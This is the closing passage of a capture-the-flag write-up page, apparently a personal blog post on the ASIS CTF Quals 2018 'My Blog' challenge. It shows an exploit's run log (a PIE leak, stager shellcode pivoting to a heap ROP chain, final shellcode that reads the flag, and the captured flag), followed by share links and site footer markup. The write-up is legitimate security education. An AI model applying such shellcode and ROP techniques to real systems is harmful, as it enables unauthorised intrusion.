+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 159.65.125.233 on port 31337: Done
+[*] Initialize srand
+[*] RWX section at        : 0x76c4d000
+[*] PIE leak              : 0x56516c3d3ef4
+[*] PIE                   : 0x56516c3d3000
+[*] Initialize stager shellcode to pivot to heap ropchain
+[*] Create ropchain to read bigger shellcode to rwx section
+[*] Send second stager shellcode to read unlimited shellcode
+[*] Send final shellcode to read/open/write flag
+[*] Switching to interactive mode
+Done!!
+Done!!
+ASIS{526eb5559eea12d1e965fe497b4abb0a308f2086}\x00\x00\x00
+...
+[*] Got EOF while reading in interactive</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=ASIS CTF Quals 2018 - My Blog&amp;url=https://kileak.github.io/ctf/2018/asisquals18-blog/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/asisquals18-blog/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/asisquals18-blog';
+        var disqus_title = 'ASIS CTF Quals 2018 - My Blog';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/asisquals18-blog';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
